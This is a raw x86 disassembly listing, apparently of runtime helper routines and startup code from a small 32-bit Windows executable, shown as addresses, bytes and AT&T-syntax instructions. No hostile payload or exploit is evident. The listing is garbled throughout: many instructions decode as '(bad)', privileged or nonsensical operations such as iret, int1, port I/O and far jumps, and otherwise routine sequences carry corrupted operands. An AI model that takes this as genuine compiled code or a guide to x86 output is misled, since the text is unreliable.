  40b3a7:	9f                   	lahf
  40b3a8:	04 65                	add    $0x65,%al
  40b3aa:	c7                   	(bad)
  40b3ab:	90                   	nop
  40b3ac:	a8 90                	test   $0x90,%al
  40b3ae:	90                   	nop
  40b3af:	90                   	nop
  40b3b0:	55                   	push   %ebp
  40b3b1:	8b c7                	mov    %edi,%eax
  40b3b3:	8b 45 08             	mov    0x8(%ebp),%eax
  40b3b6:	8d 48 17             	lea    0x17(%eax),%ecx
  40b3b9:	b8 d1 55 55 55       	mov    $0x555555d1,%eax
  40b3be:	63 e9                	arpl   %ebp,%ecx
  40b3c0:	ba ca c1 e9 1f       	mov    $0x1fe9c1ca,%edx
  40b3c5:	03 d1                	add    %ecx,%edx
  40b3c7:	8d 04 cd 01 00 00 00 	lea    0x1(,%ecx,8),%eax
  40b3ce:	5d                   	pop    %ebp
  40b3cf:	c2 04 00             	ret    $0x4
  40b3d2:	90                   	nop
  40b3d3:	90                   	nop
  40b3d4:	60                   	pusha
  40b3d5:	fd                   	std
  40b3d6:	90                   	nop
  40b3d7:	90                   	nop
  40b3d8:	90                   	nop
  40b3d9:	90                   	nop
  40b3da:	66 90                	xchg   %ax,%ax
  40b3dc:	0d 90 90 90 55       	or     $0x55909090,%eax
  40b3e1:	8b ec                	mov    %esp,%ebp
  40b3e3:	31 45 10             	xor    %eax,0x10(%ebp)
  40b3e6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b3e9:	8b 55 08             	mov    0x8(%ebp),%edx
  40b3ec:	50                   	push   %eax
  40b3ed:	51                   	push   %ecx
  40b3ee:	52                   	push   %edx
  40b3ef:	e8 fc 00 00 00       	call   0x40b4f0
  40b3f4:	ea c2 0c 00 48 90 cb 	ljmp   $0xcb90,$0x48000cc2
  40b3fb:	64 90                	fs nop
  40b3fd:	90                   	nop
  40b3fe:	90                   	nop
  40b3ff:	c6                   	(bad)
  40b400:	55                   	push   %ebp
  40b401:	8b ec                	mov    %esp,%ebp
  40b403:	8b 55 10             	mov    0x10(%ebp),%edx
  40b406:	8b 5b 08             	mov    0x8(%ebx),%ebx
  40b409:	a1 1b 1e 4a fe       	mov    0xfe4a1e1b,%eax
  40b40e:	33 f6                	xor    %esi,%esi
  40b410:	56                   	push   %esi
  40b411:	8b 7d 3d             	mov    0x3d(%ebp),%edi
  40b414:	85 c9                	test   %ecx,%ecx
  40b416:	45                   	inc    %ebp
  40b417:	6b 33 d2             	imul   $0xffffffd2,(%ebx),%esi
  40b41a:	33 db                	xor    %ebx,%ebx
  40b41c:	4e                   	dec    %esi
  40b41d:	cf                   	iret
  40b41e:	60                   	pusha
  40b41f:	83 c6 5b             	add    $0x5b,%esi
  40b422:	c1 68 02 40          	shrl   $0x40,0x2(%eax)
  40b426:	8a 92 18 c7 40 00    	mov    0x40c718(%edx),%dl
  40b42c:	88 50 ff             	mov    %dl,-0x1(%eax)
  40b42f:	8a 54 37 fd          	mov    -0x3(%edi,%esi,1),%dl
  40b433:	8a 5c 37 fe          	mov    -0x2(%edi,%esi,1),%bl
  40b437:	83 e2 85             	and    $0xffffff85,%edx
  40b43a:	4a                   	dec    %edx
  40b43b:	e2 04                	loop   0x40b441
  40b43d:	16                   	push   %ss
  40b43e:	eb 04                	jmp    0x40b444
  40b440:	0b d3                	or     %ebx,%edx
  40b442:	73 db                	jae    0x40b41f
  40b444:	40                   	inc    %eax
  40b445:	8a 92 6d c7 40 00    	mov    0x40c76d(%edx),%dl
  40b44b:	ca 50 ff             	lret   $0xff50
  40b44e:	8a 54 37 fe          	mov    -0x2(%edi,%esi,1),%dl
  40b452:	de 5c 4b 04          	ficomps 0x4(%ebx,%ecx,2)
  40b456:	83 e2 0f             	and    $0xf,%edx
  40b459:	6a e2                	push   $0xffffffe2
  40b45b:	02 c1                	add    %cl,%al
  40b45d:	eb 06                	jmp    0x40b465
  40b45f:	0b d3                	or     %ebx,%edx
  40b461:	40                   	inc    %eax
  40b462:	e4 92                	in     $0x92,%al
  40b464:	18 c7                	sbb    %al,%bh
  40b466:	40                   	inc    %eax
  40b467:	00 88 d3 ff 8a 54    	add    %cl,0x548affd3(%eax)
  40b46d:	37                   	aaa
  40b46e:	86 83 e2 3f 40 3b    	xchg   %al,0x3b403fe2(%ebx)
  40b474:	f1                   	int1
  40b475:	2b 92 18 c7 40 00    	sub    0x40c718(%edx),%edx
  40b47b:	88 50 ff             	mov    %dl,-0x1(%eax)
  40b47e:	7c 51                	jl     0x40b4d1
  40b480:	8b 55 8f             	mov    -0x71(%ebp),%edx
  40b483:	97                   	xchg   %eax,%edi
  40b484:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40b485:	7d 5f                	jge    0x40b4e6
  40b487:	33 c9                	xor    %ecx,%ecx
  40b489:	8a 0c 3e             	mov    (%esi,%edi,1),%cl
  40b48c:	c1 e9 02             	shr    $0x2,%ecx
  40b48f:	c1 4a 8a f9          	rorl   $0xf9,-0x76(%edx)
  40b493:	18 c7                	sbb    %al,%bh
  40b495:	40                   	inc    %eax
  40b496:	8c 3b                	mov    %?,(%ebx)
  40b498:	5d                   	pop    %ebp
  40b499:	88 48 ff             	mov    %cl,-0x1(%eax)
  40b49c:	8a 14 14             	mov    (%esp,%edx,1),%dl
  40b49f:	75 15                	jne    0x40b4b6
  40b4a1:	83 ed 03             	sub    $0x3,%ebp
  40b4a4:	28 e2                	sub    %ah,%dl
  40b4a6:	04 89                	add    $0x89,%al
  40b4a8:	8a 8a 18 35 40 00    	mov    0x403518(%edx),%cl
  40b4ae:	88 48 ff             	mov    %cl,-0x1(%eax)
  40b4b1:	c6 00 3d             	movb   $0x3d,(%eax)
  40b4b4:	eb 2b                	jmp    0x40b4e1
  40b4b6:	8d 3c b4             	lea    (%esp,%esi,4),%edi
  40b4b9:	01 33                	add    %esi,(%ebx)
  40b4bb:	ea 83 e2 f8 73 19 c1 	ljmp   $0xc119,$0x73f8e283
  40b4c2:	e2 04                	loop   0x40b4c8
  40b4c4:	c1 eb 04             	shr    $0x4,%ebx
  40b4c7:	eb 20                	jmp    0x40b4e9
  40b4c9:	40                   	inc    %eax
  40b4ca:	8a fb                	mov    %bl,%bh
  40b4cc:	18 c7                	sbb    %al,%bh
  40b4ce:	40                   	inc    %eax
  40b4cf:	97                   	xchg   %eax,%edi
  40b4d0:	88 50 00             	mov    %dl,0x0(%eax)
  40b4d3:	8a 0d 83 e1 0f 8a    	mov    0x8a0fe183,%cl
  40b4d9:	14 8d                	adc    $0x8d,%al
  40b4db:	18 29                	sbb    %ch,(%ecx)
  40b4dd:	40                   	inc    %eax
  40b4de:	be 45 10 40 c6       	mov    $0xc6401045,%esi
  40b4e3:	ca c0 40             	lret   $0x40c0
  40b4e6:	8b 55 c9             	mov    -0x37(%ebp),%edx
  40b4e9:	c6                   	(bad)
  40b4ea:	b7 00                	mov    $0x0,%bh
  40b4ec:	2b c2                	sub    %edx,%eax
  40b4ee:	5f                   	pop    %edi
  40b4ef:	5e                   	pop    %esi
  40b4f0:	39 02                	cmp    %eax,(%edx)
  40b4f2:	5d                   	pop    %ebp
  40b4f3:	85 0c 00             	test   %ecx,(%eax,%eax,1)
  40b4f6:	90                   	nop
  40b4f7:	90                   	nop
  40b4f8:	90                   	nop
  40b4f9:	90                   	nop
  40b4fa:	90                   	nop
  40b4fb:	90                   	nop
  40b4fc:	05 90 90 90 83       	add    $0x83909090,%eax
  40b501:	3d 58 40 f3 00       	cmp    $0xf34058,%eax
  40b506:	ff 75 0c             	push   0xc(%ebp)
  40b509:	ff 29                	ljmp   *(%ecx)
  40b50b:	24 04                	and    $0x4,%al
  40b50d:	3c 77                	cmp    $0x77,%al
  40b50f:	f8                   	clc
  40b510:	c0 40 00 fe          	rolb   $0xfe,0x0(%eax)
  40b514:	c3                   	ret
  40b515:	68 54 40 41 00       	push   $0x414054
  40b51a:	68 95 40 41 00       	push   $0x414095
  40b51f:	ff 74 44 0c          	push   0xc(%esp,%eax,2)
  40b523:	e8 f8 03 83 00       	call   0xc3b920
  40b528:	fd                   	std
  40b529:	c4 af c3 ff 74 24    	les    0x2474ffc3(%edi),%ebp
  40b52f:	88 62 cb             	mov    %ah,-0x35(%edx)
  40b532:	ff                   	(bad)
  40b533:	ff                   	(bad)
  40b534:	ff f7                	push   %edi
  40b536:	d8 b6 c0 59 f7 32    	fdivs  0x32f759c0(%esi)
  40b53c:	48                   	dec    %eax
  40b53d:	c3                   	ret
  40b53e:	cc                   	int3
  40b53f:	0f 8b 44 24 5f 8b    	jnp    0x8b9fd989
  40b545:	4c                   	dec    %esp
  40b546:	b4 10                	mov    $0x10,%ah
  40b548:	0b c8                	or     %eax,%ecx
  40b54a:	8b 4c 24 1b          	mov    0x1b(%esp),%ecx
  40b54e:	55                   	push   %ebp
  40b54f:	09 8b f3 24 04 f7    	or     %ecx,-0x8fbdb0d(%ebx)
  40b555:	e1 c2                	loope  0x40b519
  40b557:	dc 00                	faddl  (%eax)
  40b559:	53                   	push   %ebx
  40b55a:	f7 e1                	mul    %ecx
  40b55c:	8b d8                	mov    %eax,%ebx
  40b55e:	8b 44 24 08          	mov    0x8(%esp),%eax
  40b562:	07                   	pop    %es
  40b563:	64 24 8e             	fs and $0x8e,%al
  40b566:	03 d8                	add    %eax,%ebx
  40b568:	8b 44 24 08          	mov    0x8(%esp),%eax
  40b56c:	83 e1 98             	and    $0xffffff98,%ecx
  40b56f:	99                   	cltd
  40b570:	5b                   	pop    %ebx
  40b571:	c0 10 00             	rclb   $0x0,(%eax)
  40b574:	cc                   	int3
  40b575:	cc                   	int3
  40b576:	00 cc                	add    %cl,%ah
  40b578:	cc                   	int3
  40b579:	cc                   	int3
  40b57a:	cc                   	int3
  40b57b:	cc                   	int3
  40b57c:	cc                   	int3
  40b57d:	cc                   	int3
  40b57e:	cc                   	int3
  40b57f:	cc                   	int3
  40b580:	ff 25 bc c1 40 00    	jmp    *0x40c1bc
  40b586:	cc                   	int3
  40b587:	31 cc                	xor    %ecx,%esp
  40b589:	d6                   	salc
  40b58a:	cc                   	int3
  40b58b:	40                   	inc    %eax
  40b58c:	cc                   	int3
  40b58d:	cc                   	int3
  40b58e:	cc                   	int3
  40b58f:	de 57 56             	ficoms 0x56(%edi)
  40b592:	53                   	push   %ebx
  40b593:	33 ff                	xor    %edi,%edi
  40b595:	c1 44 24 14 0b       	roll   $0xb,0x14(%esp)
  40b59a:	c0 7d 14 47          	sarb   $0x47,0x14(%ebp)
  40b59e:	8b c4                	mov    %esp,%eax
  40b5a0:	24 34                	and    $0x34,%al
  40b5a2:	f7 d8                	neg    %eax
  40b5a4:	f7 da                	neg    %edx
  40b5a6:	2d d8 00 89 44       	sub    $0x448900d8,%eax
  40b5ab:	24 bf                	and    $0xbf,%al
  40b5ad:	89 54 24 10          	mov    %edx,0x10(%esp)
  40b5b1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40b5b5:	0b c0                	or     %eax,%eax
  40b5b7:	7d 14                	jge    0x40b5cd
  40b5b9:	0a 8b c6 24 18 f7    	or     -0x8e7db3a(%ebx),%cl
  40b5bf:	d8 f7                	fdiv   %st(7),%st
  40b5c1:	da 83 83 4a 89 44    	fiaddl 0x44894a83(%ebx)
  40b5c7:	83 0c 89 54          	orl    $0x54,(%ecx,%ecx,4)
  40b5cb:	24 18                	and    $0x18,%al
  40b5cd:	fb                   	sti
  40b5ce:	1b 75 c4             	sbb    -0x3c(%ebp),%esi
  40b5d1:	8b 71 24             	mov    0x24(%ecx),%esi
  40b5d4:	18 8b 44 24 14 9a    	sbb    %cl,-0x65ebdbbc(%ebx)
  40b5da:	d2 f7                	shl    %cl,%bh
  40b5dc:	f1                   	int1
  40b5dd:	e6 d8                	out    %al,$0xd8
  40b5df:	db 44 24 10          	fildl  0x10(%esp)
  40b5e3:	f7 f1                	div    %ecx
  40b5e5:	8b 42 eb             	mov    -0x15(%edx),%eax
  40b5e8:	41                   	inc    %ecx
  40b5e9:	8b d8                	mov    %eax,%ebx
  40b5eb:	8b 4c 9b 18          	mov    0x18(%ebx,%ebx,4),%ecx
  40b5ef:	8b 54 24 9b          	mov    -0x65(%esp),%edx
  40b5f3:	8b 44 41 d7          	mov    -0x29(%ecx,%eax,2),%eax
  40b5f7:	d1 eb                	shr    $1,%ebx
  40b5f9:	d1 d9                	rcr    $1,%ecx
  40b5fb:	d1 ea                	shr    $1,%edx
  40b5fd:	2c d8                	sub    $0xd8,%al
  40b5ff:	0b 35 75 f4 f7 f1    	or     0xf1f7f475,%esi
  40b605:	8b f0                	mov    %eax,%esi
  40b607:	f7 64 24 1c          	mull   0x1c(%esp)
  40b60b:	8b c8                	mov    %eax,%ecx
  40b60d:	a9 44 24 15 f7       	test   $0xf7152444,%eax
  40b612:	e6 03                	out    %al,$0x3
  40b614:	52                   	push   %edx
  40b615:	72 0e                	jb     0x40b625
  40b617:	f5                   	cmc
  40b618:	54                   	push   %esp
  40b619:	24 fb                	and    $0xfb,%al
  40b61b:	77 08                	ja     0x40b625
  40b61d:	72 07                	jb     0x40b626
  40b61f:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40b623:	76 43                	jbe    0x40b668
  40b625:	4e                   	dec    %esi
  40b626:	10 d2                	adc    %dl,%dl
  40b628:	8b c6                	mov    %esi,%eax
  40b62a:	3f                   	aas
  40b62b:	31 07                	xor    %eax,(%edi)
  40b62d:	f7 da                	neg    %edx
  40b62f:	25 d8 83 da d3       	and    $0xd3da83d8,%eax
  40b634:	66 5e                	pop    %si
  40b636:	5f                   	pop    %edi
  40b637:	c2 10 00             	ret    $0x10
  40b63a:	55                   	push   %ebp
  40b63b:	8b ec                	mov    %esp,%ebp
  40b63d:	6a ff                	push   $0xffffffff
  40b63f:	8f                   	(bad)
  40b640:	60                   	pusha
  40b641:	72 40                	jb     0x40b683
  40b643:	00 68 48             	add    %ch,0x48(%eax)
  40b646:	b9 40 f5 64 a1       	mov    $0xa164f540,%ecx
  40b64b:	00 00                	add    %al,(%eax)
  40b64d:	00 00                	add    %al,(%eax)
  40b64f:	50                   	push   %eax
  40b650:	64 5e                	fs pop %esi
  40b652:	25 00 00 00 00       	and    $0x0,%eax
  40b657:	83 ec 20             	sub    $0x20,%esp
  40b65a:	53                   	push   %ebx
  40b65b:	56                   	push   %esi
  40b65c:	57                   	push   %edi
  40b65d:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40b660:	83 a9 fc 00 17 fd ff 	subl   $0xffffffff,-0x2e8ff04(%ecx)
  40b667:	57                   	push   %edi
  40b668:	d0 c0                	rol    $1,%al
  40b66a:	40                   	inc    %eax
  40b66b:	00 77 83             	add    %dh,-0x7d(%edi)
  40b66e:	0d 54 40 41 00       	or     $0x414054,%eax
  40b673:	ff 83 0d 58 40 41    	incl   0x4140580d(%ebx)
  40b679:	00 ff                	add    %bh,%bh
  40b67b:	ff 15 40 c0 40 00    	call   *0x40c040
  40b681:	22 0d 98 0b 41 e0    	and    0xe0410b98,%cl
  40b687:	89 08                	mov    %ecx,(%eax)
  40b689:	ff 15 d8 c0 69 00    	call   *0x69c0d8
  40b68f:	8b 0d 4f 0b 41 00    	mov    0x410b4f,%ecx
  40b695:	89 08                	mov    %ecx,(%eax)
  40b697:	a1 dc c0 a2 00       	mov    0xa2c0dc,%eax
  40b69c:	bb 00 a3 50 40       	mov    $0x4050a300,%ebx
  40b6a1:	41                   	inc    %ecx
  40b6a2:	88 e8                	mov    %ch,%al
  40b6a4:	9f                   	lahf
  40b6a5:	02 00                	add    (%eax),%al
  40b6a7:	00 31                	add    %dh,(%ecx)
  40b6a9:	3d 50 02 ad 00       	cmp    $0xad0250,%eax
  40b6ae:	59                   	pop    %ecx
  40b6af:	75 bb                	jne    0x40b66c
  40b6b1:	68 81 b9 40 00       	push   $0x40b981
  40b6b6:	ff 15 e0 0d 40 0d    	call   *0xd400de0
  40b6bc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b6bd:	e8 70 02 00 00       	call   0x40b932
  40b6c2:	68 0c 21 40 00       	push   $0x40210c
  40b6c7:	68 08 d0 40 32       	push   $0x3240d008
  40b6cc:	e8 5b 02 00 00       	call   0x40b92c
  40b6d1:	23 90 0b 41 00 e8    	and    -0x17ffbef5(%eax),%edx
  40b6d7:	83 d8 58             	sbb    $0x58,%eax
  40b6da:	45                   	inc    %ebp
  40b6db:	d8 50 ff             	fcoms  -0x1(%eax)
  40b6de:	35 8c 0b 41 7b       	xor    $0x7b410b8c,%eax
  40b6e3:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b6e6:	50                   	push   %eax
  40b6e7:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40b6ea:	50                   	push   %eax
  40b6eb:	8d                   	lea    (bad),%esi
  40b6ec:	f7 67 4a             	mull   0x4a(%edi)
  40b6ef:	ff 15 e8 c0 40 00    	call   *0x40c0e8
  40b6f5:	68 4a 63 40 00       	push   $0x40634a
  40b6fa:	68 00 d0 f9 00       	push   $0xf9d000
  40b6ff:	e8 28 02 00 00       	call   0x40b92c
  40b704:	6a 15                	push   $0x15
  40b706:	ec                   	in     (%dx),%al
  40b707:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  40b70b:	4d                   	dec    %ebp
  40b70c:	29 89 08 ff 75 92    	sub    %ecx,-0x6d8a00f8(%ecx)
  40b712:	2e b8 d4 ff 75 e4    	cs mov $0xe475ffd4,%eax
  40b718:	e8 e3 58 ff ff       	call   0x401000
  40b71d:	05 2c 30 89 45       	add    $0x4589302c,%eax
  40b722:	dc 50 ff             	fcoml  -0x1(%eax)
  40b725:	15 70 c1 40 00       	adc    $0x40c170,%eax
  40b72a:	8b 45 ef             	mov    -0x11(%ebp),%eax
  40b72d:	8b 08                	mov    (%eax),%ecx
  40b72f:	6b 09 89             	imul   $0xffffff89,(%ecx),%ecx
  40b732:	4d                   	dec    %ebp
  40b733:	d0 50 51             	rclb   $1,0x51(%eax)
  40b736:	e8 eb 01 00 00       	call   0x40b926
  40b73b:	59                   	pop    %ecx
  40b73c:	59                   	pop    %ecx
  40b73d:	c3                   	ret
  40b73e:	0f 65 d4             	pcmpgtw %mm4,%mm2
  40b741:	ff 75 31             	push   0x31(%ebp)
  40b744:	ff 15 f4 c0 40 00    	call   *0x40c0f4
  40b74a:	cc                   	int3
  40b74b:	cc                   	int3
  40b74c:	cc                   	int3
  40b74d:	cc                   	int3
  40b74e:	cc                   	int3
  40b74f:	d5 53                	aad    $0x53
  40b751:	57                   	push   %edi
  40b752:	33 ff                	xor    %edi,%edi
  40b754:	8b bc 24 10 0b c0 7d 	mov    0x7dc00b10(%esp),%edi
  40b75b:	14 30                	adc    $0x30,%al
  40b75d:	7c 54                	jl     0x40b7b3
  40b75f:	df 0c f7             	fisttps (%edi,%esi,8)
  40b762:	d8 a8 da 6b 3c 00    	fsubrs 0x3c6bda(%eax)
  40b768:	89 44 24 10          	mov    %eax,0x10(%esp)
  40b76c:	89 54 24 ae          	mov    %edx,-0x52(%esp)
  40b770:	8b 44 38 18          	mov    0x18(%eax,%edi,1),%eax
  40b774:	0b c0                	or     %eax,%eax
  40b776:	7d 13                	jge    0x40b78b
  40b778:	6b 54 24 14 07       	imul   $0x7,0x14(%esp),%edx
  40b77d:	52                   	push   %edx
  40b77e:	f7 da                	neg    %edx
  40b780:	22 d8                	and    %al,%bl
  40b782:	f4                   	hlt
  40b783:	9f                   	lahf
  40b784:	44                   	inc    %esp
  40b785:	24 73                	and    $0x73,%al
  40b787:	89 7e 24             	mov    %edi,0x24(%esi)
  40b78a:	14 0b                	adc    $0xb,%al
  40b78c:	c0 75 1b 8b          	shlb   $0x8b,0x1b(%ebp)
  40b790:	ea 24 14 05 44 24 10 	ljmp   $0x1024,$0x44051424
  40b797:	10 d1                	adc    %dl,%cl
  40b799:	f7 f1                	div    %ecx
  40b79b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b79f:	f7 f1                	div    %ecx
  40b7a1:	8b 32                	mov    (%edx),%esi
  40b7a3:	33 d2                	xor    %edx,%edx
  40b7a5:	4f                   	dec    %edi
  40b7a6:	cd 4e                	int    $0x4e
  40b7a8:	eb 87                	jmp    0x40b731
  40b7aa:	8b d8                	mov    %eax,%ebx
  40b7ac:	8b 4c 24 72          	mov    0x72(%esp),%ecx
  40b7b0:	8b b2 24 10 8b 44    	mov    0x448b1024(%edx),%esi
  40b7b6:	24 0c                	and    $0xc,%al
  40b7b8:	d1 eb                	shr    $1,%ebx
  40b7ba:	d1 d9                	rcr    $1,%ecx
  40b7bc:	d1 ea                	shr    $1,%edx
  40b7be:	d1 2b                	shrl   $1,(%ebx)
  40b7c0:	0b db                	or     %ebx,%ebx
  40b7c2:	2a 6e 15             	sub    0x15(%esi),%ch
  40b7c5:	f1                   	int1
  40b7c6:	8b c8                	mov    %eax,%ecx
  40b7c8:	f7 64 ec 18          	mull   0x18(%esp,%ebp,8)
  40b7cc:	91                   	xchg   %eax,%ecx
  40b7cd:	f7 64 24 3f          	mull   0x3f(%esp)
  40b7d1:	03 d1                	add    %ecx,%edx
  40b7d3:	72 0e                	jb     0x40b7e3
  40b7d5:	3b 28                	cmp    (%eax),%ebp
  40b7d7:	24 10                	and    $0x10,%al
  40b7d9:	88 18                	mov    %bl,(%eax)
  40b7db:	72 0e                	jb     0x40b7eb
  40b7dd:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  40b7e1:	76 08                	jbe    0x40b7eb
  40b7e3:	58                   	pop    %eax
  40b7e4:	44                   	inc    %esp
  40b7e5:	24 14                	and    $0x14,%al
  40b7e7:	1b 54 24 18          	sbb    0x18(%esp),%edx
  40b7eb:	2b 44 24 3a          	sub    0x3a(%esp),%eax
  40b7ef:	1b 2f                	sbb    (%edi),%ebp
  40b7f1:	24 25                	and    $0x25,%al
  40b7f3:	7e 2e                	jle    0x40b823
  40b7f5:	07                   	pop    %es
  40b7f6:	f7 da                	neg    %edx
  40b7f8:	f7 d8                	neg    %eax
  40b7fa:	b0 da                	mov    $0xda,%al
  40b7fc:	00 38                	add    %bh,(%eax)
  40b7fe:	5b                   	pop    %ebx
  40b7ff:	c2 10 00             	ret    $0x10
  40b802:	cc                   	int3
  40b803:	cc                   	int3
  40b804:	cc                   	int3
  40b805:	09 cc                	or     %ecx,%esp
  40b807:	cc                   	int3
  40b808:	90                   	nop
  40b809:	cc                   	int3
  40b80a:	cc                   	int3
  40b80b:	cc                   	int3
  40b80c:	cc                   	int3
  40b80d:	cc                   	int3
  40b80e:	cc                   	int3
  40b80f:	cc                   	int3
  40b810:	80 17 40             	adcb   $0x40,(%edi)
  40b813:	62 16                	bound  %edx,(%esi)
  40b815:	0f f9 20             	psubw  (%eax),%mm4
  40b818:	73 70                	jae    0x40b88a
  40b81a:	0f ad d0             	shrd   %cl,%edx,%eax
  40b81d:	d3 fa                	sar    %cl,%edx
  40b81f:	c3                   	ret
  40b820:	8b c2                	mov    %edx,%eax
  40b822:	06                   	push   %es
  40b823:	fa                   	cli
  40b824:	c0 80 e1 1f d3 f8 c3 	rolb   $0xc3,-0x72ce01f(%eax)
  40b82b:	c1 98 1f 8b c2 c3 cc 	rcrl   $0xcc,-0x3c3d74e1(%eax)
  40b832:	cc                   	int3
  40b833:	cc                   	int3
  40b834:	30 cc                	xor    %cl,%ah
  40b836:	84 cc                	test   %cl,%ah
  40b838:	cc                   	int3
  40b839:	e5 cc                	in     $0xcc,%eax
  40b83b:	cc                   	int3
  40b83c:	cc                   	int3
  40b83d:	cc                   	int3
  40b83e:	cc                   	int3
  40b83f:	cc                   	int3
  40b840:	51                   	push   %ecx
  40b841:	3d 00 10 56 00       	cmp    $0x561000,%eax
  40b846:	11 4f 07             	adc    %ecx,0x7(%edi)
  40b849:	60                   	pusha
  40b84a:	7b 14                	jnp    0x40b860
  40b84c:	08 c2                	or     %al,%dl
  40b84e:	00 10                	add    %dl,(%eax)
  40b850:	00 00                	add    %al,(%eax)
  40b852:	61                   	popa
  40b853:	00 10                	add    %dl,(%eax)
  40b855:	00 00                	add    %al,(%eax)
  40b857:	85 01                	test   %eax,(%ecx)
  40b859:	12 00                	adc    (%eax),%al
  40b85b:	10 00                	adc    %al,(%eax)
  40b85d:	00 73 60             	add    %dh,0x60(%ebx)
  40b860:	2b c8                	sub    %eax,%ecx
  40b862:	8b c4                	mov    %esp,%eax
  40b864:	0c 01                	or     $0x1,%al
  40b866:	8b e1                	mov    %ecx,%esp
  40b868:	8b 08                	mov    (%eax),%ecx
  40b86a:	3c 40                	cmp    $0x40,%al
  40b86c:	04 9d                	add    $0x9d,%al
  40b86e:	c3                   	ret
  40b86f:	cc                   	int3
  40b870:	e4 f9                	in     $0xf9,%al
  40b872:	40                   	inc    %eax
  40b873:	6c                   	insb   (%dx),%es:(%edi)
  40b874:	15 80 f9 20 73       	adc    $0x7320f980,%eax
  40b879:	06                   	push   %es
  40b87a:	0f a5 c2             	shld   %cl,%eax,%edx
  40b87d:	3b e0                	cmp    %eax,%esp
  40b87f:	9f                   	lahf
  40b880:	8b d0                	mov    %eax,%edx
  40b882:	33 c0                	xor    %eax,%eax
  40b884:	e4 e4                	in     $0xe4,%al
  40b886:	1f                   	pop    %ds
  40b887:	d3 b1 c3 33 0d 33    	shll   %cl,0x330d33c3(%ecx)
  40b88d:	d2 c3                	rol    %cl,%bl
  40b88f:	cc                   	int3
  40b890:	53                   	push   %ebx
  40b891:	56                   	push   %esi
  40b892:	8b 44 24 18          	mov    0x18(%esp),%eax
  40b896:	0b c0                	or     %eax,%eax
  40b898:	75 18                	jne    0x40b8b2
  40b89a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40b89e:	ba 44 24 10 33       	mov    $0x33102444,%edx
  40b8a3:	d2 f7                	shl    %cl,%bh
  40b8a5:	f1                   	int1
  40b8a6:	dc d8                	(bad)
  40b8a8:	8b 1c 24             	mov    (%esp),%ebx
  40b8ab:	0c af                	or     $0xaf,%al
  40b8ad:	f1                   	int1
  40b8ae:	8b d3                	mov    %ebx,%edx
  40b8b0:	eb 41                	jmp    0x40b8f3
  40b8b2:	8b c8                	mov    %eax,%ecx
  40b8b4:	8b 8f 24 ff 8b 54    	mov    0x548bff24(%edi),%ecx
  40b8ba:	24 10                	and    $0x10,%al
  40b8bc:	d8 44 76 0c          	fadds  0xc(%esi,%esi,2)
  40b8c0:	1a e9                	sbb    %cl,%ch
  40b8c2:	d1 db                	rcr    $1,%ebx
  40b8c4:	d1 fa                	sar    $1,%edx
  40b8c6:	d1 d8                	rcr    $1,%eax
  40b8c8:	0b c9                	or     %ecx,%ecx
  40b8ca:	75 f4                	jne    0x40b8c0
  40b8cc:	f7 f3                	div    %ebx
  40b8ce:	8b f0                	mov    %eax,%esi
  40b8d0:	c6 b8                	xabort $0xb8,(bad)
  40b8d2:	24 18                	and    $0x18,%al
  40b8d4:	8b c8                	mov    %eax,%ecx
  40b8d6:	9a 5d 24 14 f7 e6 03 	lcall  $0x3e6,$0xf714245d
  40b8dd:	d1 72 98             	shll   $1,-0x68(%edx)
  40b8e0:	3b 54 24 10          	cmp    0x10(%esp),%edx
  40b8e4:	77 08                	ja     0x40b8ee
  40b8e6:	cf                   	iret
  40b8e7:	07                   	pop    %es
  40b8e8:	3b 44 11 e3          	cmp    -0x1d(%ecx,%edx,1),%eax
  40b8ec:	76 01                	jbe    0x40b8ef
  40b8ee:	4e                   	dec    %esi
  40b8ef:	33 d2                	xor    %edx,%edx
  40b8f1:	59                   	pop    %ecx
  40b8f2:	c6                   	(bad)
  40b8f3:	5e                   	pop    %esi
  40b8f4:	5b                   	pop    %ebx
  40b8f5:	3a 10                	cmp    (%eax),%dl
  40b8f7:	ee                   	out    %al,(%dx)
  40b8f8:	cc                   	int3
  40b8f9:	5c                   	pop    %esp
  40b8fa:	cc                   	int3
  40b8fb:	cc                   	int3
  40b8fc:	cc                   	int3
  40b8fd:	cc                   	int3
  40b8fe:	5d                   	pop    %ebp
  40b8ff:	cc                   	int3
  40b900:	80 f9 40             	cmp    $0x40,%cl
  40b903:	7d 15                	jge    0x40b91a
  40b905:	13 63 20             	adc    0x20(%ebx),%esp
  40b908:	73 06                	jae    0x40b910
  40b90a:	0f ad d0             	shrd   %cl,%edx,%eax
  40b90d:	d3 f7                	shl    %cl,%edi
  40b90f:	c3                   	ret
  40b910:	8b c2                	mov    %edx,%eax
  40b912:	33 d2                	xor    %edx,%edx
  40b914:	80 e1 1f             	and    $0x1f,%cl
  40b917:	d3 b0 81 33 bd 33    	shll   %cl,0x33bd3381(%eax)
  40b91d:	d9 c3                	fld    %st(3)
  40b91f:	cc                   	int3
  40b920:	ff 25 fc a8 40 00    	jmp    *0x40a8fc
  40b926:	ff 25 f0 b5 40 00    	jmp    *0x40b5f0
  40b92c:	ff 25 e4 73 40 00    	jmp    *0x4073e4
  40b932:	68 23 00 03 00       	push   $0x30023
  40b937:	1b 00                	sbb    (%eax),%eax
  40b939:	00 01                	add    %al,(%ecx)
  40b93b:	00 e8                	add    %ch,%al
  40b93d:	0d 8c 00 00 59       	or     $0x5900008c,%eax
  40b942:	59                   	pop    %ecx
  40b943:	c3                   	ret
  40b944:	33 c0                	xor    %eax,%eax
  40b946:	c3                   	ret
  40b947:	c3                   	ret
  40b948:	ff 25 cc 3a 40 00    	jmp    *0x403acc
  40b94e:	ff 25 b6 c1 40 00    	jmp    *0x40c1b6
  40b954:	cc                   	int3
  40b955:	cc                   	int3
  40b956:	cc                   	int3
  40b957:	5b                   	pop    %ebx
  40b958:	a3 cc cc cc cc       	mov    %eax,0xcccccccc
  40b95d:	cc                   	int3
  40b95e:	cc                   	int3
  40b95f:	cc                   	int3
  40b960:	ff 25 cc c1 40 77    	jmp    *0x7740c1cc
